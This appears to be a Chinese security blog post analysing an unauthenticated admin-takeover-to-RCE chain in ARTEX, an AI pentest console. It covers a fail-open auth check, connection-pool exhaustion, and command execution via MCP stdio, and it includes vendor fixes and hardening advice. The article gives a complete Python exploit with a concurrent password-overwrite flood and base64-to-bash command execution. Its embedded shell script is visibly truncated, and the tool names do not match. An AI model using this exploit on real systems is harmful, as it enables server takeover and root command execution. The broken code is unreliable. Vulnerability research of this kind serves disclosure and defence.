#  【漏洞分析】ARTEX 未认证访问导致 RCE 漏洞深度剖析  
原创 网络安全民工
                        网络安全民工  网络安全民工   2026-10-18 05:01  
  
#   
  
**摘要**  
：ARTEX 是一款基于 Go 与 Next.js 构建的 AI 自主渗透测试控制台。本文详细分析了 ARTEX 在 v0.1.0 - v0.3.14 版本中存在的一个严重安全漏洞。该漏洞源于代码层的“Fail-Open”（故障放行）逻辑缺陷，结合未认证接口的白名单机制及数据库连接池无限流配置，攻击者可利用并发请求打满 PostgreSQL 连接，触发未认证的管理员密码覆盖，最终通过 MCP 的 stdio  
 传输模式实现主机层面的远程命令执行（RCE）。官方已在 v0.3.15 版本中完成修复。  
## 一、 产品背景与架构  
  
**ARTEX**  
 是一款面向企业攻击面的 AI 自主渗透测试控制台，支持任务编排、资产扫描、漏洞发现与利用等功能。  
- **技术栈**  
：Go（后端）+ Next.js（前端）。  
  
- **默认端口**  
：管理端 8787  
，MCP 代理 8788  
。  
  
- **核心组件**  
：依赖 PostgreSQL 存储数据；支持通过 OpenAI / Anthropic 兼容接口接入大模型；支持 MCP (Model Context Protocol) 工具扩展。  
  
- **风险点**  
：MCP 支持 stdio  
、http  
、sse  
 三种传输方式，其中 stdio  
 允许主进程直接启动本地子进程，这成为了最终 RCE 的关键执行点。此外，管理端默认暴露在 0.0.0.0:8787  
，若缺乏访问控制，风险极高。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/T0ibbhsCmribTeUjLwPhNJrUO5cPicg0OF1iakiaTZ5QLlMxXoPKwIbm79Yy4gzDibwRtlZFn2JfDMZwianU4x6VqWe3r5UFmUS0tZ5MTVlYqhzYV8/640?wx_fmt=png&from=appmsg "")  
## 二、 漏洞原理分析  
### 2.1 核心缺陷：未处理的 Error 导致 Fail-Open  
  
漏洞位于 server/auth.go  
 的 authInit  
 函数中。该函数用于首次设置管理员密码，但在校验是否已初始化时，**显式丢弃了数据库查询返回的 error**  
：  
```
// server/auth.go (v0.3.14)
func (s *Server) authInit(w http.ResponseWriter, r *http.Request) {
    pg := s.pg(w)
    existing, _, _ := pg.GetSetting(authPassKey)  // ← error 被丢弃
    if existing != "" {
        writeErr(w, 403, "密码已设置")
        return
    }
    // ... bcrypt ...
    if err := pg.SetSetting(authPassKey, string(hash)); err != nil { ... } // ← upsert 覆盖
    tok, _ := signJWT(s.jwtKey)
    writeJSON(w, 200, map[string]any{"token": tok})
}
```  
  
在底层的 GetSetting  
 函数中，“键不存在”（sql.ErrNoRows  
）和“读取失败”（数据库连接失败等）返回的 value  
 均为空字符串，唯一的区分标志是 error  
。由于 authInit  
 忽略了 error，**“读取失败”被错误地判定为“从未设置密码”**  
，进而继续执行后续的密码写入逻辑（使用 INSERT ... ON CONFLICT DO UPDATE  
 即 upsert，直接覆盖已有密码）。  
### 2.2 攻击面扩大：未认证可达与连接池耗尽  
- **未认证访问**  
：requireAuth  
 中间件将整个 /api/auth/*  
 前缀列为了白名单。因此，任何未认证的访问者都可以无限并发地调用 /api/auth/init  
。  
  
- **触发条件**  
：旧版代码中未设置 SetMaxOpenConns  
，database/sql  
 默认不限制应用侧连接数。当攻击者发起高并发请求时，会迅速耗尽 PostgreSQL 的 max_connections  
。此时新连接被拒绝，GetSetting  
 返回 error，**Fail-Open 逻辑被成功触发**  
。  
  
### 2.3 从认证绕接到 RCE  
  
拿到被覆盖后的管理员 JWT 后，攻击者可以调用 POST /api/mcp  
，传入 transport: "stdio"  
 和恶意的 command  
/args  
。由于 MCP 协议的固有设计（拥有 MCP 创建权限即拥有命令执行权限），服务端会直接将配置交给 exec.Command  
 启动子进程，从而将认证绕过升级为服务器命令执行。  
## 三、 影响范围  
- **受影响版本**  
：v0.1.0 – v0.3.14  
  
- **修复版本**  
：v0.3.15 及以后（修复提交：8d8c102  
，PR #197）  
  
- **漏洞类型**  
：CWE-636 (Fail Open) / CWE-754 (异常条件处理不当)  
  
- **影响后果**  
：  
  
- **未认证管理员接管**  
：无需原密码即可重置管理员密码。  
  
- **服务器命令执行**  
：通过 stdio  
 MCP 以 ARTEX 进程权限执行任意命令。  
  
- **横向风险**  
：ARTEX 本身具备扫描与利用能力，失陷后可被作为内网跳板。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/T0ibbhsCmribRCHXkFuiaZtRarobz3qcqD6BbeTib2HSq4lqTSK2VPDuviaKPNUMxWBxd3rKxLbvpTdg46TiabKjoeOzJ10VVR5YGM1NsfrypMruw/640?wx_fmt=png&from=appmsg "")  
## 四、 漏洞复现过程 (PoC)  
### 4.1 指纹确认  
  
通过访问 GET /api/health  
，根据响应头或版本信息确认目标存在漏洞版本。  
### 4.2 并发触发 Fail-Open  
  
向 /api/auth/init  
 发起高并发 POST 请求，重置密码：  
- **Payload**  
: {"password":"<REDACTED_PASSWORD>"}  
  
- **并发配置**  
: 800 workers，2 轮。  
  
- **结果统计**  
: {"403": 245, "200": 44, "500": 3, "TimeoutError": 508}  
  
- **44个 200**  
：Fail-open 生效，密码被成功覆盖。  
  
- *245个 403*：数据库读取正常，返回“密码已设置”。  
  
- 500 / 超时  
：数据库/网络连接异常。  
  
### 4.3 登录获取管理员 JWT  
  
使用重置后的密码调用 POST /api/auth/login  
，获取合法的管理员 Bearer Token。  
### 4.4 发送 RCE 请求 (MCP stdio)  
  
利用管理员 JWT 调用 /api/mcp  
 接口，注入执行 id  
 命令的 shell 脚本：  
```
POST /api/mcp HTTP/1.1
Host: TARGET_HOST
Authorization: Bearer <JWT>
Content-Type: application/json
{
  "name": "test_rce_id", 
  "transport": "stdio", 
  "command": "/bin/sh",
  "args": ["-c", "OUT=OUT\""],
  "enabled": true
}
```  
  
ARTEX 在创建 MCP 条目时会同步执行工具发现，即启动 /bin/sh 并完成 MCP 握手。  
### 4.5 回读命令执行结果  
  
通过 GET /api/mcp/{id}/tools  
 获取工具缓存信息，对返回的 description  
 字段进行 Base64 解码。获取到输出 uid=0(root)  
，证明 MCP 子进程以 Root 身份运行，RCE 成立。  
### 4.6 完整攻击链路图  
```
① POST /api/auth/init (无认证、可无限并发)
       │
       ▼ 800 并发打满 PostgreSQL max_connections
② GetSetting 返回 error
       │
       ▼ authInit 丢弃 error，existing="" 被当成"未初始化"
③ SetSetting upsert 覆盖管理员密码哈希，返回 JWT
       │
       ▼
④ POST /api/auth/login 用攻击者密码换取合法管理员会话
       │
       ▼
⑤ POST /api/mcp, transport=stdio, command=/bin/sh
       │
       ▼ ARTEX 以自身进程权限 exec 子进程
⑥ 子进程执行 id -> uid=0(root)
       │
       ▼ 结果封装进 MCP tool description
⑦ GET /api/mcp/{id}/tools 回读缓存，得到命令输出
```  
## 五、 修复与安全建议  
### 5.1 官方修复方案（升级至 v0.3.15+）  
  
官方通过 PR #197 (8d8c102  
) 完成了三处关键修复：  
1. **Fail-Closed**  
：authInit  
 / authStatus  
 读取出错时返回 503  
，不再放行。  
  
1. **禁止覆盖**  
：写入逻辑由 upsert  
 改为 INSERT ... ON CONFLICT DO NOTHING  
。  
  
1. **连接池限流**  
：增加 SetMaxOpenConns(32)  
 / SetMaxIdleConns(32)  
，并补充连接寿命与空闲淘汰策略。  
  
### 5.2 部署与访问控制  
- **网络隔离**  
：管理端口默认只监听 127.0.0.1  
。公网访问应通过 VPN、SSH 隧道或带认证的反向代理进行。  
  
- **接口限流**  
：对 /api/auth/init  
 等敏感接口增加来源限速与并发上限。  
  
### 5.3 认证与会话管理  
- JWT 应绑定密码版本，改密后旧 Token 立即失效。  
  
- 登录、改密、初始化等操作必须写入审计日志（不记录凭据正文）。  
  
- 增加登录失败计数与持久化锁定机制。  
  
### 5.4 MCP 安全加固  
- **白名单校验**  
：对 stdio  
 类型 MCP 的 command  
 / args  
 进行严格的白名单校验，或直接禁用不必要的 stdio  
 传输。  
  
- **权限最小化**  
：MCP 子进程应使用低权限用户运行，绝对避免使用 root。  
  
- **定期审计**  
：定期检查 mcp_servers  
 数据表，清理可疑条目。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/T0ibbhsCmribSlfvMwwib0NSXWZoia7DN2wILxQek9SxLVyln2IqzCMurlKWy0tAs9SSOF0icV4NPyPj1ks4IfFy2QqKb0ba9F1RC3RpghxLIQmM/640?wx_fmt=png&from=appmsg "")  
## 六、完整POC  
```
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import requests
import json
import base64
import sys
import argparse
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib3.exceptions import InsecureRequestWarning
# 禁用警告提示
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
class ArtexExploit:
    def __init__(self, target, timeout=10):
        self.target = target.rstrip('/')
        self.timeout = timeout
    def check_health(self):
        """指纹确认：检查目标是否存活及版本信息"""
        url = f"{self.target}/api/health"
        try:
            r = requests.get(url, timeout=self.timeout, verify=False)
            if r.status_code == 200:
                data = r.json()
                print(f"[*] 目标在线: {data}")
                return data
            else:
                print(f"[-] 目标响应异常，状态码: {r.status_code}")
        except Exception as e:
            print(f"[-] 目标不可达: {e}")
        return None
    def trigger_fail_open(self, new_password, workers=800, rounds=2):
        """利用并发打满数据库连接池，触发 Fail-Open 覆盖管理员密码"""
        url = f"{self.target}/api/auth/init"
        payload = json.dumps({"password": new_password})
        headers = {"Content-Type": "application/json"}
        success = False
        for r_idx in range(rounds):
            print(f"[*] 正在执行第 {r_idx+1}/{rounds} 轮并发攻击 (并发数: {workers})...")
            codes = {}
            def req():
                try:
                    # 设置短超时，因为目的是打满数据库连接
                    r = requests.post(url, data=payload, headers=headers, timeout=3, verify=False)
                    return r.status_code
                except requests.exceptions.Timeout:
                    return "TimeoutError"
                except requests.exceptions.ConnectionError:
                    return "ConnectionError"
                except Exception:
                    return "OtherError"
            # 使用线程池并发发起请求
            with ThreadPoolExecutor(max_workers=workers) as executor:
                futures = [executor.submit(req) for _ in range(workers)]
                for future in as_completed(futures):
                    res = future.result()
                    codes[res] = codes.get(res, 0) + 1
            print(f"    本轮统计: {json.dumps(codes)}")
            if 200 in codes:
                print("[+] 成功触发 Fail-Open！管理员密码可能已被重置。")
                success = True
                break
        if not success:
            print("[-] 未能触发 Fail-Open (未收到 200 响应)，目标可能已修复或并发数不足。")
        return success
    def login(self, password):
        """使用重置后的密码登录，获取管理员 JWT"""
        url = f"{self.target}/api/auth/login"
        payload = {"username": "ARTEX", "password": password}
        try:
            r = requests.post(url, json=payload, timeout=self.timeout, verify=False)
            if r.status_code == 200:
                token = r.json().get("token")
                if token:
                    print(f"[+] 成功获取 JWT: {token[:30]}...")
                    return token
            print(f"[-] 登录失败: {r.status_code} {r.text}")
        except Exception as e:
            print(f"[-] 登录请求发生异常: {e}")
        return None
    def execute_cmd(self, token, cmd):
        """通过创建 stdio MCP 执行任意系统命令"""
        url = f"{self.target}/api/mcp"
        # 将待执行命令进行 Base64 编码，避免特殊字符破坏 shell 解析
        cmd_b64 = base64.b64encode(cmd.encode()).decode()
        decoded_cmd = f"echo {cmd_b64} | base64 -d | bash"
        # 构造用于 MCP 协议握手的 JSON-RPC 响应
        jrpc1 = '{"jsonrpc":"2.0","id":1,"result":{"protocolVersion":"2024-11-05","capabilities":{"tools":{}},"serverInfo":{"name":"poc","version":"1.0"}}}'
        # 拼接 Shell 脚本逻辑：执行命令 -> 获取结果 -> 返回 MCP 初始化结果 -> 将结果作为工具描述返回
        script = f"OUT=OUT\""
        payload = {
            "name": "poc_rce_tool",
            "transport": "stdio",
            "command": "/bin/sh",
            "args": ["-c", script],
            "enabled": True
        }
        headers = {
            "Authorization": f"Bearer {token}",
            "Content-Type": "application/json"
        }
        try:
            print(f"[*] 正在发送 RCE 请求，执行命令: {cmd}")
            r = requests.post(url, json=payload, headers=headers, timeout=15, verify=False)
            if r.status_code == 200:
                data = r.json()
                mcp_id = data.get("id")
                print(f"[+] MCP 工具创建成功, 内部 ID: {mcp_id}")
                return mcp_id
            else:
                print(f"[-] MCP 创建失败: {r.status_code} {r.text}")
        except Exception as e:
            print(f"[-] MCP 请求发生异常: {e}")
        return None
    def get_result(self, token, mcp_id):
        """回读 MCP 工具缓存，提取命令执行结果"""
        url = f"{self.target}/api/mcp/{mcp_id}/tools"
        headers = {"Authorization": f"Bearer {token}"}
        try:
            r = requests.get(url, headers=headers, timeout=self.timeout, verify=False)
            if r.status_code == 200:
                data = r.json()
                tools = data.get("tools", [])
                for tool in tools:
                    if tool.get("name") == "poc_tool":
                        desc_b64 = tool.get("description", "")
                        if desc_b64:
                            result = base64.b64decode(desc_b64).decode('utf-8', errors='ignore')
                            print(f"\n[+] ===== 命令执行结果 =====")
                            print(result)
                            print(f"============================\n")
                            return result
                print("[-] 未在返回的 tools 中找到结果。")
            else:
                print(f"[-] 获取结果失败: {r.status_code} {r.text}")
        except Exception as e:
            print(f"[-] 获取结果时发生异常: {e}")
        return None
def main():
    parser = argparse.ArgumentParser(description="ARTEX Fail-Open 未授权接管 RCE POC")
    parser.add_argument("-u", "--url", required=True, help="目标 URL (例: http://127.0.0.1:8787)")
    parser.add_argument("-p", "--password", default="P@ssw0rd!2026", help="重置的管理员密码 (默认: P@ssw0rd!2026)")
    parser.add_argument("-c", "--command", default="id", help="要执行的系统命令 (默认: id)")
    parser.add_argument("-w", "--workers", type=int, default=800, help="并发触发时的 Worker 数量 (默认: 800)")
    parser.add_argument("-r", "--rounds", type=int, default=2, help="并发触发的轮数 (默认: 2)")
    args = parser.parse_args()
    print("=============================================")
    print("=== ARTEX Fail-Open RCE POC               ===")
    print("=== 警告: 仅供授权安全测试使用，请勿非法利用 ===")
    print("=============================================\n")
    exploit = ArtexExploit(args.url)
    # 1. 检查目标是否存活
    health = exploit.check_health()
    if not health:
        sys.exit(1)
    # 2. 并发触发 Fail-Open，覆盖管理员密码
    if not exploit.trigger_fail_open(args.password, args.workers, args.rounds):
        sys.exit(1)
    # 3. 使用新密码登录获取 JWT
    token = exploit.login(args.password)
    if not token:
        sys.exit(1)
    # 4. 通过 MCP stdio 发送 RCE 请求
    mcp_id = exploit.execute_cmd(token, args.command)
    if not mcp_id:
        sys.exit(1)
    # 5. 等待片刻，回读工具缓存获取命令执行结果
    print("[*] 等待缓存同步...")
    import time
    time.sleep(2)
    exploit.get_result(token, mcp_id)
if __name__ == "__main__":
    main()
```  
  
免责声明：本文仅供网络安全防御与教学研究使用，请勿用于未授权的渗透测试，使用者需自行承担因不当使用造成的一切后果。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/T0ibbhsCmribTlgMbl9yxHOZz35CLd5aibHxsQmK8liaQE3QooicbRaVbk1yickItDD6XZBIQkJgeqQLo3aL2wWrogK19UdiaOGPhXfLhlHCKzqlWc/640?wx_fmt=png&from=appmsg "")  
  
  
